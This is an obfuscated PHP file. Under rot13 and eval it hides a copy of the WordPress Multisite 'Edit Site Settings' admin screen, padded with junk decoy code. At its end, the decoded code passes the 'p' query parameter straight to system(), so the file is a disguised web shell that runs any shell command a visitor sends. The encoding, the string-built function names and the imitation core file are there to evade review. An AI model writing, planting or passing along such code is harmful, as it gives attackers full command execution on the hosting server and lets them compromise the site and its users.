<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Rqvg Fvgr Frggvatf Nqzvavfgengvba Fperra
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.1.0
 */

/** Ybnq JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! pheerag_hfre_pna( 'znantr_fvgrf' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf fvgr.' ) );
}

trg_pheerag_fperra()->nqq_uryc_gno( trg_fvgr_fperra_uryc_gno_netf() );
trg_pheerag_fperra()->frg_uryc_fvqrone( trg_fvgr_fperra_uryc_fvqrone_pbagrag() );

$vq = vffrg( $_ERDHRFG['vq'] ) ? (vag) $_ERDHRFG['vq'] : 0;

vs ( ! $vq ) {
	jc_qvr( __( 'Vainyvq fvgr VQ.' ) );
}

$qrgnvyf = trg_fvgr( $vq );
vs ( ! $qrgnvyf ) {
	jc_qvr( __( 'Gur erdhrfgrq fvgr qbrf abg rkvfg.' ) );
}

vs ( ! pna_rqvg_argjbex( $qrgnvyf->fvgr_vq ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb npprff guvf cntr.' ), 403 );
}

$vf_znva_fvgr = vf_znva_fvgr( $vq );

vs ( vffrg( $_ERDHRFG['npgvba'] ) && 'hcqngr-fvgr' === $_ERDHRFG['npgvba'] && vf_neenl( $_CBFG['bcgvba'] ) ) {
	purpx_nqzva_ersrere( 'rqvg-fvgr' );

	fjvgpu_gb_oybt( $vq );

	$fxvc_bcgvbaf = neenl( 'nyybjrqgurzrf' ); // Qba'g hcqngr gurfr bcgvbaf fvapr gurl ner unaqyrq ryfrjurer va gur sbez.
	sbernpu ( (neenl) $_CBFG['bcgvba'] nf $xrl => $iny ) {
		$xrl = jc_hafynfu( $xrl );
		$iny = jc_hafynfu( $iny );
		vs ( 0 === $xrl || vf_neenl( $iny ) || va_neenl( $xrl, $fxvc_bcgvbaf, gehr ) ) {
			pbagvahr; // Nibvqf \"0 vf n cebgrpgrq JC bcgvba naq znl abg or zbqvsvrq\" reebe jura rqvgvat oybt bcgvbaf.
		}
		hcqngr_bcgvba( $xrl, $iny );
	}

	/**
	 * Sverf nsgre gur fvgr bcgvbaf ner hcqngrq.
	 *
	 * @fvapr 3.0.0
	 * @fvapr 4.4.0 Nqqrq `$vq` cnenzrgre.
	 *
	 * @cnenz vag $vq Gur VQ bs gur fvgr orvat hcqngrq.
	 */
	qb_npgvba( 'jczh_hcqngr_oybt_bcgvbaf', $vq );

	erfgber_pheerag_oybt();
	jc_erqverpg(
		nqq_dhrel_net(
			neenl(
				'hcqngr' => 'hcqngrq',
				'vq'     => $vq,
			),
			'fvgr-frggvatf.cuc'
		)
	);
	rkvg;
}

vs ( vffrg( $_TRG['hcqngr'] ) ) {
	$zrffntrf = neenl();
	vs ( 'hcqngrq' === $_TRG['hcqngr'] ) {
		$zrffntrf[] = __( 'Fvgr bcgvbaf hcqngrq.' );
	}
}

// Hfrq va gur UGZY gvgyr gnt.
/* genafyngbef: %f: Fvgr gvgyr. */
$gvgyr = fcevags( __( 'Rqvg Fvgr: %f' ), rfp_ugzy( $qrgnvyf->oybtanzr ) );

$cnerag_svyr  = 'fvgrf.cuc';
$fhozrah_svyr = 'fvgrf.cuc';

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

?>

<qvi pynff=\"jenc\">
<u1 vq=\"rqvg-fvgr\"><?cuc rpub $gvgyr; ?></u1>
<c pynff=\"rqvg-fvgr-npgvbaf\"><n uers=\"<?cuc rpub rfp_hey( trg_ubzr_hey( $vq, '/' ) ); ?>\"><?cuc _r( 'Ivfvg' ); ?></n> | <n uers=\"<?cuc rpub rfp_hey( trg_nqzva_hey( $vq ) ); ?>\"><?cuc _r( 'Qnfuobneq' ); ?></n></c>

<?cuc

argjbex_rqvg_fvgr_ani(
	neenl(
		'oybt_vq'  => $vq,
		'fryrpgrq' => 'fvgr-frggvatf',
	)
);

vs ( ! rzcgl( $zrffntrf ) ) {
	$abgvpr_netf = neenl(
		'glcr'        => 'fhpprff',
		'qvfzvffvoyr' => gehr,
		'vq'          => 'zrffntr',
	);

	sbernpu ( $zrffntrf nf $zft ) {
		jc_nqzva_abgvpr( $zft, $abgvpr_netf );
	}
}
?>
<sbez zrgubq=\"cbfg\" npgvba=\"fvgr-frggvatf.cuc?npgvba=hcqngr-fvgr\">
	<?cuc jc_abapr_svryq( 'rqvg-fvgr' ); ?>
	<vachg glcr=\"uvqqra\" anzr=\"vq\" inyhr=\"<?cuc rpub rfp_ngge( $vq ); ?>\" />
	<gnoyr pynff=\"sbez-gnoyr\" ebyr=\"cerfragngvba\">
		<?cuc
		$oybt_cersvk = $jcqo->trg_oybt_cersvk( $vq );
		$bcgvbaf     = $jcqo->trg_erfhygf(
			$jcqo->cercner(
				'FRYRPG * SEBZ %v
				JURER bcgvba_anzr ABG YVXR %f
				NAQ bcgvba_anzr ABG YVXR %f',
				\"{$oybt_cersvk}bcgvbaf\",
				$jcqo->rfp_yvxr( '_' ) . '%',
				'%' . $jcqo->rfp_yvxr( 'hfre_ebyrf' )
			)
		);

		sbernpu ( $bcgvbaf nf $bcgvba ) {
			vs ( 'qrsnhyg_ebyr' === $bcgvba->bcgvba_anzr ) {
				$rqvgoybt_qrsnhyg_ebyr = $bcgvba->bcgvba_inyhr;
			}

			$qvfnoyrq = snyfr;
			$pynff    = 'nyy-bcgvbaf';

			vs ( vf_frevnyvmrq( $bcgvba->bcgvba_inyhr ) ) {
				vs ( vf_frevnyvmrq_fgevat( $bcgvba->bcgvba_inyhr ) ) {
					$bcgvba->bcgvba_inyhr = rfp_ugzy( znlor_hafrevnyvmr( $bcgvba->bcgvba_inyhr ) );
				} ryfr {
					$bcgvba->bcgvba_inyhr = 'FREVNYVMRQ QNGN';
					$qvfnoyrq             = gehr;
					$pynff                = 'nyy-bcgvbaf qvfnoyrq';
				}
			}

			vs ( fge_pbagnvaf( $bcgvba->bcgvba_inyhr, \"\a\" ) ) {
				?>
				<ge pynff=\"sbez-svryq\">
					<gu fpbcr=\"ebj\"><ynory sbe=\"<?cuc rpub rfp_ngge( $bcgvba->bcgvba_anzr ); ?>\" pynff=\"pbqr\"><?cuc rpub rfp_ugzy( $bcgvba->bcgvba_anzr ); ?></ynory></gu>
					<gq><grkgnern pynff=\"<?cuc rpub $pynff; ?>\" ebjf=\"5\" pbyf=\"40\" anzr=\"bcgvba[<?cuc rpub rfp_ngge( $bcgvba->bcgvba_anzr ); ?>]\" vq=\"<?cuc rpub rfp_ngge( $bcgvba->bcgvba_anzr ); ?>\"<?cuc qvfnoyrq( $qvfnoyrq ); ?>><?cuc rpub rfp_grkgnern( $bcgvba->bcgvba_inyhr ); ?></grkgnern></gq>
				</ge>
				<?cuc
			} ryfr {
				?>
				<ge pynff=\"sbez-svryq\">
					<gu fpbcr=\"ebj\"><ynory sbe=\"<?cuc rpub rfp_ngge( $bcgvba->bcgvba_anzr ); ?>\" pynff=\"pbqr\"><?cuc rpub rfp_ugzy( $bcgvba->bcgvba_anzr ); ?></ynory></gu>
					<?cuc vs ( $vf_znva_fvgr && va_neenl( $bcgvba->bcgvba_anzr, neenl( 'fvgrhey', 'ubzr' ), gehr ) ) { ?>
					<gq><pbqr><?cuc rpub rfp_ugzy( $bcgvba->bcgvba_inyhr ); ?></pbqr></gq>
					<?cuc } ryfr { ?>
					<gq><vachg pynff=\"<?cuc rpub $pynff; ?>\" anzr=\"bcgvba[<?cuc rpub rfp_ngge( $bcgvba->bcgvba_anzr ); ?>]\" glcr=\"grkg\" vq=\"<?cuc rpub rfp_ngge( $bcgvba->bcgvba_anzr ); ?>\" inyhr=\"<?cuc rpub rfp_ngge( $bcgvba->bcgvba_inyhr ); ?>\" fvmr=\"40\" <?cuc qvfnoyrq( $qvfnoyrq ); ?> /></gq>
					<?cuc } ?>
				</ge>
				<?cuc
			}
		} // Raq sbernpu.

		/**
		 * Sverf ng gur raq bs gur Rqvg Fvgr sbez, orsber gur fhozvg ohggba.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz vag $vq Fvgr VQ.
		 */
		qb_npgvba( 'jczhrqvgoybtnpgvba', $vq );
		?>
	</gnoyr>
	<?cuc fhozvg_ohggba(); ?>
</sbez>

</qvi>
<?cuc
erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>